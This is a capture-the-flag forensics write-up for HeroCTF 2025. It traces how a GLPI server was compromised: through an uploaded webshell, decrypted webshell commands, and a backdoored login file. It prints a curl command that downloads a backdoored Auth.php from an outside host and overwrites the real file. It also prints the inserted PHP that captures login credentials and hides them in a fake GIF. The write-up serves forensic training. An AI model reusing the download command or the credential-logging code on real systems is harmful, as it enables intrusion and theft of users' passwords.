---
author: NmToan
date: 2025-12-28T04:59:04.866Z
lastmod: 2026-04-27T00:00:00.000Z
title: HeroCTF 2025 Forensics 2
slug: HeroCTF-2025-Forensics-2
featured: true
draft: false
tags:
  - Forensics
  - HeroCTF2025
description: Write-up for HeroCTF 2025 Forensics 2 on investigating `pensive.hogwarts.local` to find how Albus Dumbledore's account was compromised.
---

> **Topic:** Investigating `pensive.hogwarts.local` to determine how the attacker compromised Albus Dumbledore's account  
> **Goal:** Return the flag in the format  
> `Hero{/var/idk/file.ext;/var/idk/file.ext;AnExample?}`

## Challenge Description

The challenge states that the Hogwarts director's account was compromised. The last legitimate login came from `192.168.56.230` on `pensive.hogwarts.local`. The task is to investigate that server and identify:

1. the absolute path of the file that led to the compromise,
2. the absolute path of the file used by the attacker to retrieve Albus's account,
3. the second field of the second record stored in the second file.

The three findings must be joined with `;`.

## High-Level Approach

After extracting the provided data, I ended up with two main directories:

- `/var/log`
- `/var/www/glpi`

From the previous challenge, Forensics 1, I already knew the attacker's IP address was `192.168.56.200`. So the first step was to search the logs for that IP. The first strong lead appeared in a log entry related to `var/www/glpi/ajax/fileupload.php`:

```text
192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 742 "-" "python-requests/2.32.5"
```

This indicates that the attacker uploaded a file called `setup.php` through GLPI's upload mechanism. That becomes the first file worth investigating.

## 1. Analyze `setup.php`

Searching the extracted filesystem revealed:

- `/var/www/glpi/files/_tmp/setup.php`

The file is a GLPI-specific webshell. Its most important behavior is the handling of the `save_result` parameter: the attacker can send an AES-256-CBC encrypted string, the server decrypts it, and then executes it with `exec()`.

In practice, `setup.php` gives the attacker the ability to:

1. dump sensitive GLPI data such as LDAP and database credentials,
2. execute commands remotely through HTTP requests,
3. hide the commands by encrypting them with a hardcoded key and IV.

So the first file that led to the compromise is this webshell.

## 2. Recover the Commands Run Through the Webshell

After identifying the webshell, I went back to the logs and searched for requests containing `save_result`:

```bash
strings glpi_ssl_access.log | grep 'save_result'
```

That produced entries such as:

```text
192.168.56.1 - - [22/Nov/2025:23:09:36 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== HTTP/1.1" 200 12649 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
192.168.56.1 - - [22/Nov/2025:23:10:02 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= HTTP/1.1" 200 28264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
192.168.56.1 - - [22/Nov/2025:23:10:51 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== HTTP/1.1" 200 28168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0"
```

Using the hardcoded AES key and IV from `setup.php`, I decoded the payloads with Python:

```python
import base64
from Crypto.Cipher import AES

key = b"14ac4b90bd3f880e741a85b0c6254d1f"
iv  = b"5cf025270d8f74c9"

samples = [
    "oGAHt/Kk1OKeXWxy7iXUfw==",
    "4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=",
    "86AyGErKuj5UoZE9eHtlIg=="
]

for s in samples:
    encrypted = base64.b64decode(s)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)
    decrypted = decrypted.rstrip(b"\x00").rstrip()
    print("Encoded :", s)
    print("Decoded :", decrypted.decode(errors="ignore"))
    print("-" * 40)
```

The important decoded commands were:

```text
curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
whoami
```

The first command shows that the attacker downloaded a backdoored file and overwrote:

- `/var/www/glpi/src/Auth.php`

This is the second key file in the attack chain.

## 3. Analyze the Backdoored `Auth.php`

The modified `Auth.php` sits directly inside the legitimate GLPI login flow. The most important inserted logic appears right before LDAP authentication:

```php
$data = json_encode([
   'login' => $login_name,
   'password' => $login_password,
]);

$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$encoded = base64_encode($encrypted) . ";";

$file = "/var/www/glpi/pics/screenshots/example.gif";
file_put_contents($file, $encoded, FILE_APPEND);
```

This backdoor:

1. captures user login credentials,
2. encrypts them with AES-256-CBC,
3. appends the encrypted output to:

- `/var/www/glpi/pics/screenshots/example.gif`

So the file used to store the stolen credentials is `example.gif`.

## 4. Extract the Credentials from `example.gif`

Checking the file showed that it is not actually an image. It is plain text containing base64 strings:

```text
mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
```

Using the key and IV embedded in `Auth.php`, I decoded the records:

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b"ec6c34408ae2523fe664bd1ccedc9c28"
iv  = b"ecb2b0364290d1df"

data = (
    "mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;"
    "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;"
)

payloads = [p for p in data.split(";") if p]

for i, p in enumerate(payloads, 1):
    encrypted = base64.b64decode(p)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)

    try:
        decrypted = unpad(decrypted, 16)
    except ValueError:
        pass

    print(f"[Record {i}]")
    print(decrypted.decode("utf-8"))
    print("-" * 40)
```

Decoded result:

```text
[Record 1]
{"login":"Flag","password":"Hero{FakeFlag:(}"}
----------------------------------------
[Record 2]
{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
----------------------------------------
```

The first record is a decoy. The second record contains Albus Dumbledore's real credentials, and the third part of the flag is the second field of the second record:

- `FawkesPhoenix#9!`

## Conclusion

The full attack chain is:

1. the attacker uploads `setup.php`,
2. the webshell is used to download and overwrite `Auth.php`,
3. the backdoored `Auth.php` logs victim credentials,
4. the captured credentials are written into `example.gif`,
5. decoding `example.gif` reveals Albus Dumbledore's password.

Final flag:

```text
Hero{/var/www/glpi/files/_tmp/setup.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
```
